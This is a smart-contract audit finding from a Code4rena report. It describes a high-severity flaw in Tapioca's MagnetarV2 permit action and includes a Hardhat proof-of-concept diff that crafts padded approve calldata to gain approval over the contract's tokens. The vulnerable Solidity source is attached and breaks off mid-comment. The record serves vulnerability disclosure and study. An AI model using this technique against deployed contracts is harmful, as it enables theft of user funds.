{
  "Title": "[H-49] User can give himself approval for all assets held by `MagnetarV2` contract",
  "Content": "\nWhen calling [MagnetarV2.\\_permit(...)](https://github.com/Tapioca-DAO/tapioca-periph-audit/blob/023751a4e987cf7c203ab25d3abba58f7344f213/contracts/Magnetar/MagnetarV2.sol#L1025-L1049) through invoking a permit (or permit all) action via [MagnetarV2.burst(...)](https://github.com/Tapioca-DAO/tapioca-periph-audit/blob/023751a4e987cf7c203ab25d3abba58f7344f213/contracts/Magnetar/MagnetarV2.sol#L192-L715), one can also execute other calls than `ERC20.permit(...)` due to the following reasons / under the following constraints:\n\n*   The `target` address can be chosen freely, can be any contract, asset, token, NFT, etc.\n*   The function selector in `actionCalldata` is not checked, i.e. not required to be `ERC20.permit(...)`\n*   The first parameter in the encoded `actionCalldata` [**must** be equal to `msg.sender`](https://github.com/Tapioca-DAO/tapioca-periph-audit/blob/023751a4e987cf7c203ab25d3abba58f7344f213/contracts/Magnetar/MagnetarV2.sol#L1036)\n*   The length of the `actionCalldata` should match the length of an encoded call to `ERC20.permit(...)` to avoid issues on [`abi.decode(...)`](https://github.com/Tapioca-DAO/tapioca-periph-audit/blob/023751a4e987cf7c203ab25d3abba58f7344f213/contracts/Magnetar/MagnetarV2.sol#L1032-L1035)\n\nGiven this information, an attacker can easily craft calls to give him approval for any assets held by the `MagnetarV2` contract or directly invoke a transfer. There are potentially other malicious calls that can be crafted and executed via the permit action, therefore the mentioned approve/transfer calls are only an example.\n\nIn order for this to cause loss of funds for the DAO, the `MagnetarV2` contract needs to hold (be the owner of) assets in the first place which seems likely since it is a main entry point and interacts with other important parts of the protocol like Singularity, BigBang, TapiocaOptionBroker and MagnetarMarketModule [(trough `delegatecall` in some cases)](https://github.com/Tapioca-DAO/tapioca-periph-audit/blob/023751a4e987cf7c203ab25d3abba58f7344f213/contracts/Magnetar/MagnetarV2.sol#L1064-L1075).\n\n### Proof of Concept\n\nThe following PoC is based on an existing test case and demonstrates that an attacker can give himself the approval of the `MagnetarV2` contract for an ERC20 token.\n\nJust apply the *diff* below in `tapioca-periph-audit` and run the test case with `npx hardhat test test/magnetar.test.ts`:\n\n<details>\n\n```diff\ndiff --git a/test/magnetar.test.ts b/test/magnetar.test.ts\nindex 63d108e..f32659d 100644\n--- a/test/magnetar.test.ts\n+++ b/test/magnetar.test.ts\n@@ -439,7 +439,7 @@ describe('MagnetarV2', () => {\n     });\n \n     describe('permits', () => {\n-        it('should test an array of permits', async () => {\n+        it.only('approve via permit action', async () => {\n             const { deployer, eoa1, magnetar } = await loadFixture(register);\n \n             const name = 'Token One';\n@@ -486,39 +486,38 @@ describe('MagnetarV2', () => {\n             );\n             const signature = signTypedMessage(privateKey, { data });\n             const { v, r, s } = fromRpcSig(signature);\n-\n+            \n+            // Original permit calldata: user/deployer gives approval about value to eo1 \n             const permitEncodedFnData = tokenOne.interface.encodeFunctionData(\n                 'permit',\n                 [deployer.address, eoa1.address, value, MAX_DEADLINE, v, r, s],\n             );\n+            \n+            // Crafted approve calldata: magnetar gives approval about value to user/deployer\n+            const approveEncodedFnData = tokenOne.interface.encodeFunctionData(\n+                'approve',\n+                [deployer.address, value],\n+            );\n+            \n+            // Pad approve calldata to length of permit calldata, otherwise magnetar reverts when decoding\n+            const approveEncodedFnDataPadded = approveEncodedFnData.padEnd(permitEncodedFnData.length, '0');\n \n             await magnetar.connect(deployer).burst([\n                 {\n-                    id: 2,\n+                    id: 2,      // PERMIT\n                     target: tokenOne.address,\n                     value: 0,\n                     allowFailure: false,\n-                    call: permitEncodedFnData,\n+                    call: approveEncodedFnDataPadded, // provide padded approval calldata\n                 },\n             ]);\n \n+            // Check if approval was successful\n             const allowance = await tokenOne.allowance(\n+                magnetar.address,\n                 deployer.address,\n-                eoa1.address,\n             );\n             expect(allowance.eq(value)).to.be.true;\n-\n-            await expect(\n-                magnetar.connect(deployer).burst([\n-                    {\n-                        id: 2,\n-                        target: tokenOne.address,\n-                        value: 0,\n-                        allowFailure: false,\n-                        call: permitEncodedFnData,\n-                    },\n-                ]),\n-            ).to.be.reverted;\n         });\n     });\n```\n\n</details>\n\n### Tools Used\n\nVS Code, Hardhat\n\n### Recommended Mitigation Steps\n\nRequire the function selector (first 4 bytes of `actionCalldata`) to match an `ERC*.permit(...)` call in [MagnetarV2.\\_permit(...)](https://github.com/Tapioca-DAO/tapioca-periph-audit/blob/023751a4e987cf7c203ab25d3abba58f7344f213/contracts/Magnetar/MagnetarV2.sol#L1025-L1049).\n\n**[0xRektora (Tapioca) confirmed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/832#issuecomment-1699903298)**\n\n***\n\n",
  "Impact": "HIGH",
  "Source": "https://code4rena.com/reports/2023-07-tapioca",
  "Code": [
    {
      "filename": "contracts/Magnetar/MagnetarV2.sol",
      "content": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.18;\n\n//OZ\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\";\n\n//TAPIOCA\nimport \"./MagnetarV2Storage.sol\";\nimport \"./modules/MagnetarMarketModule.sol\";\n\n/*\n\n__/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\_____/\\\\\\\\\\\\\\\\\\_____/\\\\\\\\\\\\\\\\\\\\\\\\\\____/\\\\\\\\\\\\\\\\\\\\\\_______/\\\\\\\\\\_____________/\\\\\\\\\\\\\\\\\\_____/\\\\\\\\\\\\\\\\\\____        \n _\\///////\\\\\\/////____/\\\\\\\\\\\\\\\\\\\\\\\\\\__\\/\\\\\\/////////\\\\\\_\\/////\\\\\\///______/\\\\\\///\\\\\\________/\\\\\\////////____/\\\\\\\\\\\\\\\\\\\\\\\\\\__       \n  _______\\/\\\\\\________/\\\\\\/////////\\\\\\_\\/\\\\\\_______\\/\\\\\\_____\\/\\\\\\_______/\\\\\\/__\\///\\\\\\____/\\\\\\/____________/\\\\\\/////////\\\\\\_      \n   _______\\/\\\\\\_______\\/\\\\\\_______\\/\\\\\\_\\/\\\\\\\\\\\\\\\\\\\\\\\\\\/______\\/\\\\\\______/\\\\\\______\\//\\\\\\__/\\\\\\_____________\\/\\\\\\_______\\/\\\\\\_     \n    _______\\/\\\\\\_______\\/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\_\\/\\\\\\/////////________\\/\\\\\\_____\\/\\\\\\_______\\/\\\\\\_\\/\\\\\\_____________\\/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\_    \n     _______\\/\\\\\\_______\\/\\\\\\/////////\\\\\\_\\/\\\\\\_________________\\/\\\\\\_____\\//\\\\\\______/\\\\\\__\\//\\\\\\____________\\/\\\\\\/////////\\\\\\_   \n      _______\\/\\\\\\_______\\/\\\\\\_______\\/\\\\\\_\\/\\\\\\_________________\\/\\\\\\______\\///\\\\\\__/\\\\\\_____\\///\\\\\\__________\\/\\\\\\_______\\/\\\\\\_  \n       _______\\/\\\\\\_______\\/\\\\\\_______\\/\\\\\\_\\/\\\\\\______________/\\\\\\\\\\\\\\\\\\\\\\____\\///\\\\\\\\\\/________\\////\\\\\\\\\\\\\\\\\\_\\/\\\\\\_______\\/\\\\\\_ \n        _______\\///________\\///________\\///__\\///______________\\///////////_______\\/////_____________\\/////////__\\///________\\///__\n\n*/\n\n/// @title Magnetar contract\n/// @notice Generic helper contract\n/// @dev can execute individual or combined actions on BigBang/Market/tOFT and USDO\n///      -  the `burst` method allows combining multiple calls into 1 transaction\ncontract MagnetarV2 is Ownable, MagnetarV2Storage {\n    using SafeERC20 for IERC20;\n    using RebaseLibrary for Rebase;\n\n    // ************ //\n    // *** VARS *** //\n    // ************ //\n    enum Module {\n        Market\n    }\n\n    /// @notice returns the Market module\n    MagnetarMarketModule public marketModule;\n\n    constructor(address _owner, address payable _marketModule) {\n        transferOwnership(_owner);\n        marketModule = MagnetarMarketModule(_marketModule);\n    }\n\n    // ******************** //\n    // *** VIEW METHODS *** //\n    // ******************** //\n    /// @notice returns Singularity markets' information\n    /// @param who user to return for\n    /// @param markets the list of Singularity markets to query for\n    function singularityMarketInfo(\n        address who,\n        ISingularity[] calldata markets\n    ) external view returns (SingularityInfo[] memory) {\n        return _singularityMarketInfo(who, markets);\n    }\n\n    /// @notice returns BigBang markets' information\n    /// @param who user to return for\n    /// @param markets the list of BigBang markets to query for\n    function bigBangMarketInfo(\n        address who,\n        IBigBang[] calldata markets\n    ) external view returns (BigBangInfo[] memory) {\n        return _bigBangMarketInfo(who, markets);\n    }\n\n    /// @notice Calculate the collateral amount off the shares.\n    /// @param market the Singularity or BigBang address\n    /// @param share The shares.\n    /// @return amount The amount.\n    function getCollateralAmountForShare(\n        IMarket market,\n        uint256 share\n    ) public view returns (uint256 amount) {\n        IYieldBoxBase yieldBox = IYieldBoxBase(market.yieldBox());\n        return yieldBox.toAmount(market.collateralId(), share, false);\n    }\n\n    /// @notice Calculate the collateral shares that are needed for `borrowPart`,\n    /// taking the current exchange rate into account.\n    /// @param market the Singularity or BigBang address\n    /// @param borrowPart The borrow part.\n    /// @return collateralShares The collateral shares.\n    function getCollateralSharesForBorrowPart(\n        IMarket market,\n        uint256 borrowPart,\n        uint256 liquidationMultiplierPrecision,\n        uint256 exchangeRatePrecision\n    ) public view returns (uint256 collateralShares) {\n        Rebase memory _totalBorrowed;\n        (uint128 totalBorrowElastic, uint128 totalBorrowBase) = market\n            .totalBorrow();\n        _totalBorrowed = Rebase(totalBorrowElastic, totalBorrowBase);\n\n        IYieldBoxBase yieldBox = IYieldBoxBase(market.yieldBox());\n        uint256 borrowAmount = _totalBorrowed.toElastic(borrowPart, false);\n        return\n            yieldBox.toShare(\n                market.collateralId(),\n                (borrowAmount *\n                    market.liquidationMultiplier() *\n                    market.exchangeRate()) /\n                    (liquidationMultiplierPrecision * exchangeRatePrecision),\n                false\n            );\n    }\n\n    /// @notice Return the equivalent of borrow part in asset amount.\n    /// @param market the Singularity or BigBang address\n    /// @param borrowPart The amount of borrow part to convert.\n    /// @return amount The equivalent of borrow part in asset amount.\n    function getAmountForBorrowPart(\n        IMarket market,\n        uint256 borrowPart\n    ) public view returns (uint256 amount) {\n        Rebase memory _totalBorrowed;\n        (uint128 totalBorrowElastic, uint128 totalBorrowBase) = market\n            .totalBorrow();\n        _totalBorrowed = Rebase(totalBorrowElastic, totalBorrowBase);\n\n        return _totalBorrowed.toElastic(borrowPart, false);\n    }\n\n    /// @notice Return the equivalent of amount in borrow part.\n    /// @param market the Singularity or BigBang address\n    /// @param amount The amount to convert.\n    /// @return part The equivalent of amount in borrow part.\n    function getBorrowPartForAmount(\n        IMarket market,\n        uint256 amount\n    ) public view returns (uint256 part) {\n        Rebase memory _totalBorrowed;\n        (uint128 totalBorrowElastic, uint128 totalBorrowBase) = market\n            .totalBorrow();\n        _totalBorrowed = Rebase(totalBorrowElastic, totalBorrowBase);\n\n        return _totalBorrowed.toBase(amount, false);\n    }\n\n    /// @notice Compute the amount of `singularity.assetId` from `fraction`\n    /// `fraction` can be `singularity.accrueInfo.feeFraction` or `singularity.balanceOf`\n    /// @param singularity the singularity address\n    /// @param fraction The fraction.\n    /// @return amount The amount.\n    function getAmountForAssetFraction(\n        ISingularity singularity,\n        uint256 fraction\n    ) public view returns (uint256 amount) {\n        (uint128 totalAssetElastic, uint128 totalAssetBase) = singularity\n            .totalAsset();\n\n        IYieldBoxBase yieldBox = IYieldBoxBase(singularity.yieldBox());\n        return\n            yieldBox.toAmount(\n                singularity.assetId(),\n                (fraction * totalAssetElastic) / totalAssetBase,\n                false\n            );\n    }\n\n    /// @notice Compute the fraction of `singularity.assetId` from `amount`\n    /// `fraction` can be `singularity.accrueInfo.feeFraction` or `singularity.balanceOf`\n    /// @param singularity the singularity address\n    /// @param amount The amount.\n    /// @return fraction The fraction.\n    function getFractionForAmount(\n        ISingularity singularity,\n        uint256 amount\n    ) public view returns (uint256 fraction) {\n        (uint128 totalAssetShare, uint128 totalAssetBase) = singularity\n            .totalAsset();\n        (uint128 totalBorrowElastic, ) = singularity.totalBorrow();\n        uint256 assetId = singularity.assetId();\n\n        IYieldBoxBase yieldBox = IYieldBoxBase(singularity.yieldBox());\n\n        uint256 share = yieldBox.toShare(assetId, amount, false);\n        uint256 allShare = totalAssetShare +\n            yieldBox.toShare(assetId, totalBorrowElastic, true);\n\n        fraction = allShare == 0 ? share : (share * totalAssetBase) / allShare;\n    }\n\n    // ********************** //\n    // *** PUBLIC METHODS *** //\n    // ********************** //\n    /// @notice Batch multiple calls together\n    /// @param calls The list of actions to perform\n    function burst(\n        Call[] calldata calls\n    ) external payable returns (Result[] memory returnData) {\n        uint256 valAccumulator;\n\n        uint256 length = calls.length;\n        returnData = new Result[](length);\n\n        for (uint256 i = 0; i < length; i++) {\n            Call calldata _action = calls[i];\n            if (!_action.allowFailure) {\n                require(\n                    _action.call.length > 0,\n                    string.concat(\n                        \"MagnetarV2: Missing call for action with index\",\n                        string(abi.encode(i))\n                    )\n                );\n            }\n\n            unchecked {\n                valAccumulator += _action.value;\n            }\n\n            if (_action.id == PERMIT_ALL) {\n                _permit(\n                    _action.target,\n                    _action.call,\n                    true,\n                    _action.allowFailure\n                );\n            } else if (_action.id == PERMIT) {\n                _permit(\n                    _action.target,\n                    _action.call,\n                    false,\n                    _action.allowFailure\n                );\n            } else if (_action.id == TOFT_WRAP) {\n                WrapData memory data = abi.decode(_action.call[4:], (WrapData));\n                _checkSender(data.from);\n                if (_action.value > 0) {\n                    unchecked {\n                        valAccumulator += _action.value;\n                    }\n                    ITapiocaOFT(_action.target).wrapNative{\n                        value: _action.value\n                    }(data.to);\n                } else {\n                    ITapiocaOFT(_action.target).wrap(\n                        msg.sender,\n                        data.to,\n                        data.amount\n                    );\n                }\n            } else if (_action.id == TOFT_SEND_FROM) {\n                (\n                    address from,\n                    uint16 dstChainId,\n                    bytes32 to,\n                    uint256 amount,\n                    ISendFrom.LzCallParams memory lzCallParams\n                ) = abi.decode(\n                        _action.call[4:],\n                        (\n                            address,\n                            uint16,\n                            bytes32,\n                            uint256,\n                            (ISendFrom.LzCallParams)\n                        )\n                    );\n                _checkSender(from);\n\n                ISendFrom(_action.target).sendFrom{value: _action.value}(\n                    msg.sender,\n                    dstChainId,\n                    to,\n                    amount,\n                    lzCallParams\n                );\n            } else if (_action.id == YB_DEPOSIT_ASSET) {\n                YieldBoxDepositData memory data = abi.decode(\n                    _action.call[4:],\n                    (YieldBoxDepositData)\n                );\n                _checkSender(data.from);\n\n                (uint256 amountOut, uint256 shareOut) = IYieldBoxBase(\n                    _action.target\n                ).depositAsset(\n                        data.assetId,\n                        msg.sender,\n                        data.to,\n                        data.amount,\n                        data.share\n                    );\n                returnData[i] = Result({\n                    success: true,\n                    returnData: abi.encode(amountOut, shareOut)\n                });\n            } else if (_action.id == MARKET_ADD_COLLATERAL) {\n                SGLAddCollateralData memory data = abi.decode(\n                    _action.call[4:],\n                    (SGLAddCollateralData)\n                );\n                _checkSender(data.from);\n\n                IMarket(_action.target).addCollateral(\n                    msg.sender,\n                    data.to,\n                    data.skim,\n                    data.amount,\n                    data.share\n                );\n            } else if (_action.id == MARKET_BORROW) {\n                SGLBorrowData memory data = abi.decode(\n                    _action.call[4:],\n                    (SGLBorrowData)\n                );\n                _checkSender(data.from);\n\n                (uint256 part, uint256 share) = IMarket(_action.target).borrow(\n                    msg.sender,\n                    data.to,\n                    data.amount\n                );\n                returnData[i] = Result({\n                    success: true,\n                    returnData: abi.encode(part, share)\n                });\n            } else if (_action.id == YB_WITHDRAW_TO) {\n                (\n                    address yieldBox,\n                    address from,\n                    uint256 assetId,\n                    uint16 dstChainId,\n                    bytes32 receiver,\n                    uint256 amount,\n                    uint256 share,\n                    bytes memory adapterParams,\n                    address payable refundAddress\n                ) = abi.decode(\n                        _action.call[4:],\n                        (\n                            address,\n                            address,\n                            uint256,\n                            uint16,\n                            bytes32,\n                            uint256,\n                            uint256,\n                            bytes,\n                            address\n                        )\n                    );\n\n                _executeModule(\n                    Module.Market,\n                    abi.encodeWithSelector(\n                        MagnetarMarketModule.withdrawToChain.selector,\n                        yieldBox,\n                        from,\n                        assetId,\n                        dstChainId,\n                        receiver,\n                        amount,\n                        share,\n                        adapterParams,\n                        refundAddress,\n                        _action.value\n                    )\n                );\n            } else if (_action.id == MARKET_LEND) {\n                SGLLendData memory data = abi.decode(\n                    _action.call[4:],\n                    (SGLLendData)\n                );\n                _checkSender(data.from);\n\n                uint256 fraction = IMarket(_action.target).addAsset(\n                    msg.sender,\n                    data.to,\n                    data.skim,\n                    data.share\n                );\n                returnData[i] = Result({\n                    success: true,\n                    returnData: abi.encode(fraction)\n                });\n            } else if (_action.id == MARKET_REPAY) {\n                SGLRepayData memory data = abi.decode(\n                    _action.call[4:],\n                    (SGLRepayData)\n                );\n                _checkSender(data.from);\n\n                uint256 amount = IMarket(_action.target).repay(\n                    msg.sender,\n                    data.to,\n                    data.skim,\n                    data.part\n                );\n                returnData[i] = Result({\n                    success: true,\n                    returnData: abi.encode(amount)\n                });\n            } else if (_action.id == TOFT_SEND_AND_BORROW) {\n                (\n                    address from,\n                    address to,\n                    uint16 lzDstChainId,\n                    bytes memory airdropAdapterParams,\n                    ITapiocaOFT.IBorrowParams memory borrowParams,\n                    ICommonData.IWithdrawParams memory withdrawParams,\n                    ICommonData.ISendOptions memory options,\n                    ICommonData.IApproval[] memory approvals\n                ) = abi.decode(\n                        _action.call[4:],\n                        (\n                            address,\n                            address,\n                            uint16,\n                            bytes,\n                            ITapiocaOFT.IBorrowParams,\n                            ICommonData.IWithdrawParams,\n                            ICommonData.ISendOptions,\n                            ICommonData.IApproval[]\n                        )\n                    );\n                _checkSender(from);\n\n                ITapiocaOFT(_action.target).sendToYBAndBorrow{\n                    value: _action.value\n                }(\n                    msg.sender,\n                    to,\n                    lzDstChainId,\n                    airdropAdapterParams,\n                    borrowParams,\n                    withdrawParams,\n                    options,\n                    approvals\n                );\n            } else if (_action.id == TOFT_SEND_AND_LEND) {\n                (\n                    address from,\n                    address to,\n                    uint16 dstChainId,\n                    address zroPaymentAddress,\n                    IUSDOBase.ILendOrRepayParams memory lendParams,\n                    ICommonData.IApproval[] memory approvals,\n                    ICommonData.IWithdrawParams memory withdrawParams,\n                    bytes memory adapterParams\n                ) = abi.decode(\n                        _action.call[4:],\n                        (\n                            address,\n                            address,\n                            uint16,\n                            address,\n                            (IUSDOBase.ILendOrRepayParams),\n                            (ICommonData.IApproval[]),\n                            (ICommonData.IWithdrawParams),\n                            bytes\n                        )\n                    );\n                _checkSender(from);\n\n                IUSDOBase(_action.target).sendAndLendOrRepay{\n                    value: _action.value\n                }(\n                    msg.sender,\n                    to,\n                    dstChainId,\n                    zroPaymentAddress,\n                    lendParams,\n                    approvals,\n                    withdrawParams,\n                    adapterParams\n                );\n            } else if (_action.id == TOFT_DEPOSIT_TO_STRATEGY) {\n                TOFTSendToStrategyData memory data = abi.decode(\n                    _action.call[4:],\n                    (TOFTSendToStrategyData)\n                );\n                _checkSender(data.from);\n\n                ITapiocaOFT(_action.target).sendToStrategy{\n                    value: _action.value\n                }(\n                    msg.sender,\n                    data.to,\n                    data.amount,\n                    data.share,\n                    data.assetId,\n                    data.lzDstChainId,\n                    data.options\n                );\n            } else if (_action.id == TOFT_RETRIEVE_FROM_STRATEGY) {\n                (\n                    address from,\n                    uint256 amount,\n                    uint256 share,\n                    uint256 assetId,\n                    uint16 lzDstChainId,\n                    address zroPaymentAddress,\n                    bytes memory airdropAdapterParam\n                ) = abi.decode(\n                        _action.call[4:],\n                        (\n                            address,\n                            uint256,\n                            uint256,\n                            uint256,\n                            uint16,\n                            address,\n                            bytes\n                        )\n                    );\n\n                _checkSender(from);\n\n                ITapiocaOFT(_action.target).retrieveFromStrategy{\n                    value: _action.value\n                }(\n                    msg.sender,\n                    amount,\n                    share,\n                    assetId,\n                    lzDstChainId,\n                    zroPaymentAddress,\n                    airdropAdapterParam\n                );\n            } else if (_action.id == MARKET_YBDEPOSIT_AND_LEND) {\n                HelperLendData memory data = abi.decode(\n                    _action.call[4:],\n                    (HelperLendData)\n                );\n\n                _executeModule(\n                    Module.Market,\n                    abi.encodeWithSelector(\n                        MagnetarMarketModule.mintFromBBAndLendOnSGL.selector,\n                        data.user,\n                        data.lendAmount,\n                        data.mintData,\n                        data.depositData,\n                        data.lockData,\n                        data.participateData,\n                        data.externalContracts\n                    )\n                );\n            } else if (_action.id == MARKET_YBDEPOSIT_COLLATERAL_AND_BORROW) {\n                (\n                    address market,\n                    address user,\n                    uint256 collateralAmount,\n                    uint256 borrowAmount,\n                    ,\n                    bool deposit,\n                    ICommonData.IWithdrawParams memory withdrawParams\n                ) = abi.decode(\n                        _action.call[4:],\n                        (\n                            address,\n                            address,\n                            uint256,\n                            uint256,\n                            bool,\n                            bool,\n                            ICommonData.IWithdrawParams\n                        )\n                    );\n\n                _executeModule(\n                    Module.Market,\n                    abi.encodeWithSelector(\n                        MagnetarMarketModule\n                            .depositAddCollateralAndBorrowFromMarket\n                            .selector,\n                        market,\n                        user,\n                        collateralAmount,\n                        borrowAmount,\n                        false,\n                        deposit,\n                        withdrawParams\n                    )\n                );\n            } else if (_action.id == MARKET_REMOVE_ASSET) {\n                HelperMarketRemoveAndRepayAsset memory data = abi.decode(\n                    _action.call[4:],\n                    (HelperMarketRemoveAndRepayAsset)\n                );\n\n                _executeModule(\n                    Module.Market,\n                    abi.encodeWithSelector(\n                        MagnetarMarketModule\n                            .exitPositionAndRemoveCollateral\n                            .selector,\n                        data.user,\n                        data.externalData,\n                        data.removeAndRepayData\n                    )\n                );\n            } else if (_action.id == MARKET_DEPOSIT_REPAY_REMOVE_COLLATERAL) {\n                HelperDepositRepayRemoveCollateral memory data = abi.decode(\n                    _action.call[4:],\n                    (HelperDepositRepayRemoveCollateral)\n                );\n\n                _executeModule(\n                    Module.Market,\n                    abi.encodeWithSelector(\n                        MagnetarMarketModule\n                            .depositRepayAndRemoveCollateralFromMarket\n                            .selector,\n                        data.market,\n                        data.user,\n                        data.depositAmount,\n                        data.repayAmount,\n                        data.collateralAmount,\n                        data.extractFromSender,\n                        data.withdrawCollateralParams\n                    )\n                );\n            } else if (_action.id == MARKET_BUY_COLLATERAL) {\n                HelperBuyCollateral memory data = abi.decode(\n                    _action.call[4:],\n                    (HelperBuyCollateral)\n                );\n\n                IMarket(data.market).buyCollateral(\n                    data.from,\n                    data.borrowAmount,\n                    data.supplyAmount,\n                    data.minAmountOut,\n                    address(data.swapper),\n                    data.dexData\n                );\n            } else if (_action.id == MARKET_SELL_COLLATERAL) {\n                HelperSellCollateral memory data = abi.decode(\n                    _action.call[4:],\n                    (HelperSellCollateral)\n                );\n\n                IMarket(data.market).sellCollateral(\n                    data.from,\n                    data.share,\n                    data.minAmountOut,\n                    address(data.swapper),\n                    data.dexData\n                );\n            } else if (_action.id == TAP_EXERCISE_OPTION) {\n                HelperExerciseOption memory data = abi.decode(\n                    _action.call[4:],\n                    (HelperExerciseOption)\n                );\n\n                ITapiocaOptionsBrokerCrossChain(_action.target).exerciseOption(\n                    data.optionsData,\n                    data.lzData,\n                    data.tapSendData,\n                    data.approvals\n                );\n            } else if (_action.id == MARKET_MULTIHOP_BUY) {\n                HelperMultiHopBuy memory data = abi.decode(\n                    _action.call[4:],\n                    (HelperMultiHopBuy)\n                );\n\n                IUSDOBase(_action.target).initMultiHopBuy(\n                    data.from,\n                    data.collateralAmount,\n                    data.borrowAmount,\n                    data.swapData,\n                    data.lzData,\n                    data.externalData,\n                    data.airdropAdapterParams,\n                    data.approvals\n                );\n            } else if (_action.id == MARKET_MULTIHOP_BUY) {\n                HelperMultiHopBuy memory data = abi.decode(\n                    _action.call[4:],\n                    (HelperMultiHopBuy)\n                );\n\n                IUSDOBase(_action.target).initMultiHopBuy(\n                    data.from,\n                    data.collateralAmount,\n                    data.borrowAmount,\n                    data.swapData,\n                    data.lzData,\n                    data.externalData,\n                    data.airdropAdapterParams,\n                    data.approvals\n                );\n            } else if (_action.id == TOFT_REMOVE_AND_REPAY) {\n                HelperTOFTRemoveAndRepayAsset memory data = abi.decode(\n                    _action.call[4:],\n                    (HelperTOFTRemoveAndRepayAsset)\n                );\n\n                IUSDOBase(_action.target).removeAsset(\n                    data.from,\n                    data.to,\n                    data.lzDstChainId,\n                    data.zroPaymentAddress,\n                    data.adapterParams,\n                    data.externalData,\n                    data.removeAndRepayData,\n                    data.approvals\n                );\n            } else {\n                revert(\"MagnetarV2: action not valid\");\n            }\n        }\n\n        require(msg.value == valAccumulator, \"MagnetarV2: value mismatch\");\n    }\n\n    /// @notice performs a withdraw operation\n    /// @dev it can withdraw on the current chain or it can send it to another one\n    ///     - if `dstChainId` is 0 performs a same-chain withdrawal\n    ///          - all parameters except `yieldBox`, `from`, `assetId` and `amount` or `share` are ignored\n    ///     - if `dstChainId` is NOT 0, the method requires gas for the `sendFrom` operation\n    /// @param yieldBox the YieldBox address\n    /// @param from user to withdraw from\n    /// @param assetId the YieldBox asset id to withdraw\n    /// @param dstChainId LZ chain id to withdraw to\n    /// @param receiver the receiver on the destination chain\n    /// @param amount the amount to withdraw\n    /// @param share the share to withdraw\n    /// @param adapterParams LZ adapter params\n    /// @param refundAddress the LZ refund address which receives the gas not used in the process\n    /// @param gas the amount of gas to use for sending the asset to another layer\n    function withdrawToChain(\n        IYieldBoxBase yieldBox,\n        address from,\n        uint256 assetId,\n        uint16 dstChainId,\n        bytes32 receiver,\n        uint256 amount,\n        uint256 share,\n        bytes memory adapterParams,\n        address payable refundAddress,\n        uint256 gas\n    ) external payable {\n        _executeModule(\n            Module.Market,\n            abi.encodeWithSelector(\n                MagnetarMarketModule.withdrawToChain.selector,\n                yieldBox,\n                from,\n                assetId,\n                dstChainId,\n                receiver,\n                amount,\n                share,\n                adapterParams,\n                refundAddress,\n                gas\n            )\n        );\n    }\n\n    /// @notice helper for deposit to YieldBox, add collateral to a market, borrom from the same market and withdraw\n    /// @dev all operations are optional:\n    ///         - if `deposit` is false it will skip the deposit to YieldBox step\n    ///         - if `withdraw` is false it will skip the withdraw step\n    ///         - if `collateralAmount == 0` it will skip the add collateral step\n    ///         - if `borrowAmount == 0` it will skip the borrow step\n    ///     - the amount deposited to YieldBox is `collateralAmount`\n    /// @param market the SGL/BigBang market\n    /// @param user the user to perform the action for\n    /// @param collateralAmount the collateral amount to add\n    /// @param borrowAmount the borrow amount\n    /// @param extractFromSender extracts collateral tokens from sender or from the user\n    /// @param deposit true/false flag for the deposit to YieldBox step\n    /// @param withdrawParams necessary data for the same chain or the cross-chain withdrawal\n    function depositAddCollateralAndBorrowFromMarket(\n        IMarket market,\n        address user,\n        uint256 collateralAmount,\n        uint256 borrowAmount,\n        bool extractFromSender,\n        bool deposit,\n        ICommonData.IWithdrawParams calldata withdrawParams\n    ) external payable {\n        _executeModule(\n            Module.Market,\n            abi.encodeWithSelector(\n                MagnetarMarketModule\n                    .depositAddCollateralAndBorrowFromMarket\n                    .selector,\n                market,\n                user,\n                collateralAmount,\n                borrowAmount,\n                extractFromSender,\n                deposit,\n                withdrawParams\n            )\n        );\n    }\n\n    /// @notice helper for deposit asset to YieldBox, repay on a market, remove collateral and withdraw\n    /// @dev all steps are optional:\n    ///         - if `depositAmount` is 0, the deposit to YieldBox step is skipped\n    ///         - if `repayAmount` is 0, the repay step is skipped\n    ///         - if `collateralAmount` is 0, the add collateral step is skipped\n    /// @param market the SGL/BigBang market\n    /// @param user the user to perform the action for\n    /// @param depositAmount the amount to deposit to YieldBox\n    /// @param repayAmount the amount to repay to the market\n    /// @param collateralAmount the amount to withdraw from the market\n    /// @param extractFromSender extracts collateral tokens from sender or from the user\n    /// @param withdrawCollateralParams withdraw specific params\n    function depositRepayAndRemoveCollateralFromMarket(\n        address market,\n        address user,\n        uint256 depositAmount,\n        uint256 repayAmount,\n        uint256 collateralAmount,\n        bool extractFromSender,\n        ICommonData.IWithdrawParams calldata withdrawCollateralParams\n    ) external payable {\n        _executeModule(\n            Module.Market,\n            abi.encodeWithSelector(\n                MagnetarMarketModule\n                    .depositRepayAndRemoveCollateralFromMarket\n                    .selector,\n                market,\n                user,\n                depositAmount,\n                repayAmount,\n                collateralAmount,\n                extractFromSender,\n                withdrawCollateralParams\n            )\n        );\n    }\n\n    /// @notice helper to deposit mint from BB, lend on SGL, lock on tOLP and participate on tOB\n    /// @dev all steps are optional:\n    ///         - if `mintData.mint` is false, the mint operation on BB is skipped\n    ///             - add BB collateral to YB, add collateral on BB and borrow from BB are part of the mint operation\n    ///         - if `depositData.deposit` is false, the asset deposit to YB is skipped\n    ///         - if `lendAmount == 0` the addAsset operation on SGL is skipped\n    ///             - if `mintData.mint` is tru"
    }
  ]
}